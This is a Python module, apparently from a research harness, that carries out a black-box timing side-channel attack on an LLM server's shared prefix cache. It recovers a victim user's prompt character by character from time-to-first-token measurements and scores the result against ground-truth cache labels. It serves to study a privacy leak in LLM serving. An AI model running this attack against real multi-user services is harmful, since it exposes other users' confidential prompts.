"""EarlyBird-style token-by-token prefix recovery — black-box timing attack.

Threat model (Gu et al. assumptions):
  * The attacker has ONLY black-box access and measures TTFT. It does NOT read
    vLLM's cache counters to make decisions — that would be white-box and defeat
    the point. Ground-truth labels are recorded solely to SCORE the result.
  * The attacker knows a prefix of the victim's prompt, and the victim's full
    prompt was served, so under a GLOBAL prefix cache the victim's token
    sequence is cached and observable.

Method: starting from the known prefix, recover the next character by appending
each candidate and timing the probe. The correct candidate extends the already
cached prefix (fast = hit); wrong candidates leave the last position uncached
(slow = miss). Greedy, one position at a time; stop when no candidate reads as a
hit (the attacker can't continue without the correct prefix).

block_size=1 is REQUIRED. A correct candidate extends the cached prefix by one
block, so the hit/miss difference is one block of compute. At block_size=16 a
single appended token almost never crosses a block boundary, so there is no
per-token signal — that is the default-mitigation effect, measured separately.
Launch the server with server.block_size: 1 (confirm the kernel accepts it with
scripts/probe_block_size.py) before expecting recovery to resolve tokens.
"""
from __future__ import annotations

import random
import statistics
import string
import time
from dataclasses import dataclass, field
from typing import Optional

from .client import TimingClient
from .config import Config
from .groundtruth import labeled_request


def _candidate_tokens(vocab: str) -> list[str]:
    """Candidate 'tokens' to probe. ascii = a tractable character stand-in for
    the model vocab; swap for a real tokenizer vocab for full EarlyBird fidelity.
    """
    if vocab == "ascii":
        return list(string.ascii_letters + string.digits + " .,!?-_@:/")
    if vocab == "full":
        raise NotImplementedError("full-vocab recovery needs the model tokenizer")
    with open(vocab) as f:
        return [line.rstrip("\n") for line in f if line.strip()]


@dataclass
class RecoveryStep:
    position: int
    guessed: Optional[str]
    correct: Optional[str]
    is_correct: Optional[bool]
    num_probes: int
    hit_ttft: Optional[float] = None
    gt_hit: Optional[bool] = None       # ground truth, for scoring only


@dataclass
class RecoveryResult:
    known_prefix: str
    target_suffix: str
    recovered: str = ""
    threshold: Optional[float] = None
    steps: list[RecoveryStep] = field(default_factory=list)

    @property
    def token_accuracy(self) -> float:
        if not self.steps:
            return 0.0
        return sum(1 for s in self.steps if s.is_correct) / len(self.steps)

    @property
    def exact_prefix_len(self) -> int:
        n = 0
        for s in self.steps:
            if s.is_correct:
                n += 1
            else:
                break
        return n


def _median_ttft(
    client: TimingClient, cfg: Config, prompt: str, user: Optional[str], repeats: int
) -> tuple[Optional[float], Optional[bool]]:
    """Measure a probe `repeats` times; return (median client TTFT, gt_hit).

    gt_hit comes from a single labeled snapshot and is returned ONLY so the
    caller can score — it is never used to choose a token.
    """
    samples: list[float] = []
    gt_hit: Optional[bool] = None
    for i in range(repeats):
        if i == 0:
            with labeled_request(cfg) as box:
                m = client.measure(cfg.model.name, prompt, max_tokens=1, user=user)
            gt_hit = box[0].hit if box[0] else None
        else:
            m = client.measure(cfg.model.name, prompt, max_tokens=1, user=user)
        if m.ok and m.client_ttft is not None:
            samples.append(m.client_ttft)
        time.sleep(cfg.timing.inter_request_delay)
    return (statistics.median(samples) if samples else None), gt_hit


def _calibrate_threshold(
    cfg: Config, client: TimingClient, known: str, attacker_user: Optional[str], trials: int
) -> Optional[float]:
    """Calibrate a per-token hit/miss TTFT boundary, black-box.

    HIT reference:  probe `known` (already cached -> fast).
    MISS reference: probe `known + <one random char>` (last position uncached ->
                    slower). One extra char matches the per-token granularity the
                    recovery decision runs at. A random char equals the true next
                    token with prob ~1/|vocab|; the median over `trials` absorbs it.
    Returns a threshold TTFT, or None if hit and miss don't separate (no signal,
    e.g. block_size>1) so the caller recovers nothing honestly.
    """
    hit_s, miss_s = [], []
    for _ in range(trials):
        m = client.measure(cfg.model.name, known, max_tokens=1, user=attacker_user)
        if m.ok and m.client_ttft is not None:
            hit_s.append(m.client_ttft)
        time.sleep(cfg.timing.inter_request_delay)
        probe = known + random.choice(string.ascii_lowercase)
        m = client.measure(cfg.model.name, probe, max_tokens=1, user=attacker_user)
        if m.ok and m.client_ttft is not None:
            miss_s.append(m.client_ttft)
        time.sleep(cfg.timing.inter_request_delay)

    if not hit_s or not miss_s:
        return None
    hit_med, miss_med = statistics.median(hit_s), statistics.median(miss_s)
    if miss_med <= hit_med:                 # no separation -> no usable signal
        return None
    return (hit_med + miss_med) / 2.0


def recover_prefix(
    cfg: Config,
    client: TimingClient,
    victim_prompt: str,
    *,
    attacker_user: Optional[str] = "attacker_user",
    victim_user: Optional[str] = "victim_user",
    hit_threshold: Optional[float] = None,
) -> RecoveryResult:
    """Greedy black-box recovery of the suffix after a known prefix."""
    repeats = int(getattr(cfg.attack, "probe_repeats", 5))
    calib_trials = int(getattr(cfg.attack, "calibration_trials", 20))

    split = int(len(victim_prompt) * cfg.attack.prefix_fraction)
    known = victim_prompt[:split]
    target = victim_prompt[split:][: cfg.attack.max_tokens_to_recover]
    result = RecoveryResult(known_prefix=known, target_suffix=target)
    candidates = _candidate_tokens(cfg.attack.candidate_vocab)

    # Victim serves the full prompt so its prefixes are cached (global cache).
    client.measure(cfg.model.name, victim_prompt, max_tokens=1, user=victim_user)
    time.sleep(cfg.timing.inter_request_delay)

    # Calibrate the timing boundary from timing alone (unless caller supplied one).
    if hit_threshold is None:
        hit_threshold = _calibrate_threshold(cfg, client, known, attacker_user, calib_trials)
    result.threshold = hit_threshold

    current = known
    for pos in range(len(target)):
        truth_char = target[pos]
        best_guess: Optional[str] = None
        best_ttft: Optional[float] = None
        best_gt: Optional[bool] = None
        probes = 0

        for cand in candidates:
            med, gt = _median_ttft(client, cfg, current + cand, attacker_user, repeats)
            probes += repeats
            if med is None:
                continue
            # Decision is pure timing: a hit is faster than the calibrated boundary.
            is_hit = (hit_threshold is not None) and (med < hit_threshold)
            if is_hit and (best_ttft is None or med < best_ttft):
                best_ttft, best_guess, best_gt = med, cand, gt

        is_correct = (best_guess == truth_char) if best_guess is not None else False
        result.steps.append(RecoveryStep(
            position=pos, guessed=best_guess, correct=truth_char,
            is_correct=is_correct, num_probes=probes, hit_ttft=best_ttft, gt_hit=best_gt,
        ))

        # Honest attacker: no hit -> the prefix is lost, stop. Never advance with truth.
        if best_guess is None:
            break
        current += best_guess
        result.recovered += best_guess

    return result
